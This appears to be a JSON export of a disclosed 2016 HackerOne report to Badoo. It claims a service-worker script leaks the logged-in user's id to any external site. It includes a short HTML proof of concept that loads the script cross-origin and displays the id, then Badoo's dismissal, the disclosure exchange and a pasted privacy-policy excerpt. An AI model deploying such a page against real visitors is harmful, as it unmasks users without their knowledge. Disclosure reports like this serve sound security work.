{"id":130453,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzA0NTM=","url":"https://hackerone.com/reports/130453","title":"Badoo and Hotornot User Disclosure","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2016-04-13T21:54:31.466Z","submitted_at":"2016-04-13T21:54:31.466Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"symbiansymoh","url":"/symbiansymoh","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1926,"url":"https://hackerone.com/badoo","handle":"badoo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/926/2d5179ec8d7d7c36af59a55d318dace33c3aa109_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/926/2d5179ec8d7d7c36af59a55d318dace33c3aa109_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Badoo","twitter_handle":"Badoo","website":"https://badoo.com","about":"Meet new people"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-05-16T07:10:56.391Z","bug_reporter_agreed_on_going_public_at":"2016-05-15T22:11:11.426Z","team_member_agreed_on_going_public_at":"2016-05-16T07:10:56.309Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI have found that endpoint is leaking the currently logged in user which will result in stealing the user id and unmasking the current user, This behavior could be malicious to ads websites, rouge websites, etc...\n\nPoC Code:\n\u003chtml\u003e\n\u003chead\u003e\n\u003ctitle\u003eBadoo Current User Unmasking\u003c/title\u003e\n\u003cscript src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cscript\u003e\nfunction UnmaskUser(str) {\nreturn str.split('=')[0];\n}\nwindow.onload = function(){\nvar user = UnmaskUser(user_id);alert(user);};\n\u003c/script\u003e\n\nThanks","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI have found that endpoint is leaking the currently logged in user which will result in stealing the user id and unmasking the current user, This behavior could be malicious to ads websites, rouge websites, etc...\u003c/p\u003e\n\n\u003cp\u003ePoC Code:\u003cbr\u003e\n\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;head\u0026gt;\u003cbr\u003e\n\u0026lt;title\u0026gt;Badoo Current User Unmasking\u0026lt;/title\u0026gt;\u003cbr\u003e\n\u0026lt;script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1\u0026gt;\u0026lt;/script\u0026gt;\u003cbr\u003e\n\u0026lt;/head\u0026gt;\u003cbr\u003e\n\u0026lt;body\u0026gt;\u003cbr\u003e\n\u0026lt;script\u0026gt;\u003cbr\u003e\nfunction UnmaskUser(str) {\u003cbr\u003e\nreturn str.split(\u0026#39;=\u0026#39;)[0];\u003cbr\u003e\n}\u003cbr\u003e\nwindow.onload = function(){\u003cbr\u003e\nvar user = UnmaskUser(user_id);alert(user);};\u003cbr\u003e\n\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-14T22:11:11.495Z","allow_singular_disclosure_after":-143273607.79943398,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":905192,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"We have user_id on every page. And don't think it's security issue.\nThanks anyway.","markdown_message":"\u003cp\u003eWe have user_id on every page. And don\u0026#39;t think it\u0026#39;s security issue.\u003cbr\u003e\nThanks anyway.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-14T09:29:56.302Z","updated_at":"2016-04-14T09:29:56.302Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":905627,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Why you don't think it's not a security issue when an external domain can extract data from your website? and maybe exploit your users in a rouge ad campaigns??","markdown_message":"\u003cp\u003eWhy you don\u0026#39;t think it\u0026#39;s not a security issue when an external domain can extract data from your website? and maybe exploit your users in a rouge ad campaigns??\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-14T13:22:06.342Z","updated_at":"2016-04-14T13:22:06.342Z","actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":905628,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cc @uyga ","markdown_message":"\u003cp\u003eCc \u003ca href=\"/uyga\"\u003e@uyga\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-14T13:22:19.870Z","updated_at":"2016-04-14T13:22:19.870Z","actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":908860,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@uyga Regarding this one, Is the attack vector isn't enough clear?","markdown_message":"\u003cp\u003e\u003ca href=\"/uyga\"\u003e@uyga\u003c/a\u003e Regarding this one, Is the attack vector isn\u0026#39;t enough clear?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-15T22:50:47.024Z","updated_at":"2016-04-15T22:50:47.024Z","actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":929599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@uyga  ???","markdown_message":"\u003cp\u003e\u003ca href=\"/uyga\"\u003e@uyga\u003c/a\u003e  ???\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-27T01:31:49.471Z","updated_at":"2016-04-27T01:31:49.471Z","actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":929980,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Once again: user_id disclosure for us isn't bug. Thanks.","markdown_message":"\u003cp\u003eOnce again: user_id disclosure for us isn\u0026#39;t bug. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-27T09:18:43.247Z","updated_at":"2016-04-27T09:18:43.247Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":958343,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I'm requesting the public disclosure since this \"isn't bug\"","markdown_message":"\u003cp\u003eI\u0026#39;m requesting the public disclosure since this \u0026quot;isn\u0026#39;t bug\u0026quot;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-15T22:11:11.454Z","updated_at":"2016-05-15T22:11:11.454Z","first_to_agree":true,"actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":958642,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure, why not.\nCheers.","markdown_message":"\u003cp\u003eSure, why not.\u003cbr\u003e\nCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T07:10:56.341Z","updated_at":"2016-05-16T07:10:56.341Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":958643,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-16T07:10:56.409Z","updated_at":"2016-05-16T07:10:56.409Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":958678,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Last thing to be mentioned here:\n\"https://eu1.badoo.com/privacy/\"\n\n\nDoes Badoo disclose my information to other parties?\nWe may share aggregated information with such parties as Foursquare that includes your personal information (but which doesn’t identify you directly), together with other information including log data with third parties for industry analysis and demographic profiling and to deliver targeted advertising about other products and services.\n\nIn particular, in relation to targeted advertising, we use third-party advertising companies to serve ads when you visit our Website. These companies may use information about your visits to this and other websites in order to provide advertisements about goods and services of interest to you. If you would like more information about this practice and to know your choices about not having this information used by these companies, please visit this page.\n\nIf you choose to, we may share your information with vendors, service providers, and other carefully selected third parties to improve our services to you, such as by facilitating payments. We ensure these parties must adhere to strict data protection and confidentiality provisions that are consistent with this Privacy Policy.\n\nBadoo also wishes to maintain a healthy community, and we will cooperate with all law enforcement inquiries and with all third parties to enforce their intellectual property or other rights. We may also disclose your personal information to government or law enforcement agencies, or private parties, as required by law when/or, in our sole discretion, we believe that disclosure is necessary to protect our legal rights, or those of third parties and/or to comply with a judicial proceeding, court order, or legal process served on us.\n\nIn the event that Badoo or any of its affiliates undergoes a business transition or change of ownership, such as a merger, acquisition by another company, re-organisation, or sale of all or a portion of its assets, or in the event of insolvency or administration, we may be required to disclose your personal information.\n","markdown_message":"\u003cp\u003eLast thing to be mentioned here:\u003cbr\u003e\n\u0026quot;\u003ca title=\"https://eu1.badoo.com/privacy/\" href=\"/redirect?url=https%3A%2F%2Feu1.badoo.com%2Fprivacy%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://eu1.badoo.com/privacy/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eDoes Badoo disclose my information to other parties?\u003cbr\u003e\nWe may share aggregated information with such parties as Foursquare that includes your personal information (but which doesn’t identify you directly), together with other information including log data with third parties for industry analysis and demographic profiling and to deliver targeted advertising about other products and services.\u003c/p\u003e\n\n\u003cp\u003eIn particular, in relation to targeted advertising, we use third-party advertising companies to serve ads when you visit our Website. These companies may use information about your visits to this and other websites in order to provide advertisements about goods and services of interest to you. If you would like more information about this practice and to know your choices about not having this information used by these companies, please visit this page.\u003c/p\u003e\n\n\u003cp\u003eIf you choose to, we may share your information with vendors, service providers, and other carefully selected third parties to improve our services to you, such as by facilitating payments. We ensure these parties must adhere to strict data protection and confidentiality provisions that are consistent with this Privacy Policy.\u003c/p\u003e\n\n\u003cp\u003eBadoo also wishes to maintain a healthy community, and we will cooperate with all law enforcement inquiries and with all third parties to enforce their intellectual property or other rights. We may also disclose your personal information to government or law enforcement agencies, or private parties, as required by law when/or, in our sole discretion, we believe that disclosure is necessary to protect our legal rights, or those of third parties and/or to comply with a judicial proceeding, court order, or legal process served on us.\u003c/p\u003e\n\n\u003cp\u003eIn the event that Badoo or any of its affiliates undergoes a business transition or change of ownership, such as a merger, acquisition by another company, re-organisation, or sale of all or a portion of its assets, or in the event of insolvency or administration, we may be required to disclose your personal information.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T07:32:58.601Z","updated_at":"2016-05-16T07:32:58.601Z","actor":{"username":"symbiansymoh","cleared":false,"url":"/symbiansymoh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/454/16c64e0ba5a92e9419d0e6bcf0ec862ab3b3f07c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}